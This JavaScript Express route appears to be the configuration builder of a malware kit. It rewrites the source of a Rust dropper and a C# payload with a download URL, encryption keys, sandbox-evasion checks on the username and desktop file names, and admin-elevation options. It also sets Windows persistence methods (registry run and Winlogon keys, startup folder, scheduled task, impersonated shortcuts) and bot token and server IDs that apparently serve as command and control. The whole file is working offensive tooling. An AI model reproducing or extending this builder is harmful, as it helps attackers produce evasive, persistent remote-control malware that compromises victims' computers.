import express from 'express';
import fs from 'fs';
import path from 'path';

import crypto from '../utils/crypto.js';
import common from '../utils/common.js';
import regex from '../utils/regex.js';

const router = express.Router();

const getPersistMethod = (method) => {
    switch (method) {
        case 'auto-run registry key':
            return 'AutoRunRegKey';
        case 'startup folder':
            return 'StartFolder';
        case 'logon registry key (requires admin)':
            return 'WinLogonRegKey';
        case 'task scheduler (requires admin)':
            return 'TaskScheduler';
        case 'impersonate desktop shortcuts':
            return 'ImpersonateLNK';
    }
};

router.post('/update-config', async (req, res) => {
    console.log('updating config...');

    const body = req.body;

    if (body.only_dropper_url) {
        try {
            const configFile = path.resolve('../Dropper/src/config.rs');
            let config = fs.readFileSync(configFile, 'utf-8');

            config = regex.stringRS(config, 'FILE_URL', crypto.encryptString(body.download_url));

            fs.writeFileSync(configFile, config, 'utf-8');
        } catch(e) {
            console.error('failed to update url for dropper -', e);

            return res
                .status(500)
                .send('failed to update url for dropper');
        }

        return res.sendStatus(200);
    }

    const cryptoKey = common.genStr(21);

    crypto.setCryptoKey(cryptoKey);
    console.log('encryption key:', cryptoKey);

    try {
        const configFile = path.resolve('../Main/Source/Config.cs');
        let config = fs.readFileSync(configFile, 'utf-8');

        config = regex.stringCS(config, 'CRYPTO_KEY', cryptoKey);
        config = regex.stringCS(config, 'LAUNCH_KEY', common.genStr(5));

        config = regex.boolCS(config, 'CHECK_USERNAME', body.main_check_username);
        config = regex.boolCS(config, 'CHECK_DESKTOP_FILE_NAMES', body.main_check_desktop_file_names);

        config = regex.boolCS(config, 'REQUIRE_ADMIN', body.require_admin);
        config = regex.boolCS(config, 'PROMPT_ADMIN', body.prompt_admin);
        config = regex.boolCS(config, 'FORCE_ADMIN', body.force_admin);
        config = regex.boolCS(config, 'CONTINUE_WITHOUT_ADMIN', body.continue_without_admin);

        config = regex.boolCS(config, 'USE_MUTEX', body.use_mutex);
        config = regex.stringCS(config, 'MUTEX_NAME', body.mutex_name
            ? crypto.encryptString(body.mutex_name)
            : crypto.encryptString(common.genStr(10))
        );

        config = regex.boolCS(config, 'ADMIN_CUSTOM_PERSISTENCE', body.better_persistence_when_admin);
        config = regex.enumCS(config, 'PERSISTENCE_METHOD', 'PersistMethod', getPersistMethod(body.persistence_method));

        config = regex.boolCS(config, 'USE_NEW_DIR', body.use_custom_directory);
        config = regex.stringCS(config, 'NEW_DIR', body.use_custom_directory
            ? crypto.encryptString(body.custom_directory_path)
            : ''
        );

        config = regex.boolCS(config, 'USE_NEW_NAME', body.use_custom_name);
        config = regex.stringCS(config, 'NEW_NAME', body.use_custom_name
            ? crypto.encryptString(body.custom_name)
            : ''
        );

        config = regex.stringCS(config, 'BOT_TOKEN', crypto.encryptString(body.bot_token));
        config = regex.stringCS(config, 'SERVER_ID', crypto.encryptString(body.server_id));
        config = regex.stringCS(config, 'CATEGORY_ID', crypto.encryptString(body.category_id));

        config = regex.stringCS(config, 'COMMAND_PREFIX', body.command_prefix);

        config = regex.stringCS(config, 'TRACKING', crypto.encryptString(body.tracking_id));

        fs.writeFileSync(configFile, config, 'utf-8');
    } catch(e) {
        console.error('failed to update config for main -', e);

        return res
            .status(500)
            .send('failed to update config for main');
    }

    try {
        const configFile = path.resolve('../Dropper/src/config.rs');
        let config = fs.readFileSync(configFile, 'utf-8');

        config = regex.stringRS(config, 'FILE_URL', body.custom_url.length > 1
            ? crypto.encryptString(body.custom_url)
            : ''
        );

        config = regex.stringRS(config, 'RANDOM_STR_1', common.genStr(7));
        config = regex.stringRS(config, 'RANDOM_STR_2', common.genStr(7));

        config = regex.boolRS(config, 'FILE_ENCRYPTED', body.encrypt_ryugyong_file);
        config = regex.stringRS(config, 'ENCRYPTION_KEY', body.encrypt_ryugyong_file
            ? cryptoKey
            : ''
        );

        config = regex.boolRS(config, 'CHECK_USERNAME', body.dropper_check_username);
        config = regex.boolRS(config, 'CHECK_DESKTOP_FILES', body.dropper_check_desktop_file_names);

        fs.writeFileSync(configFile, config, 'utf-8');
    } catch(e) {
        console.error('failed to update config for dropper -', e);

        return res
            .status(500)
            .send('failed to update config for dropper');
    }

    console.log('updated config');
    return res.sendStatus(200);
});

export default router;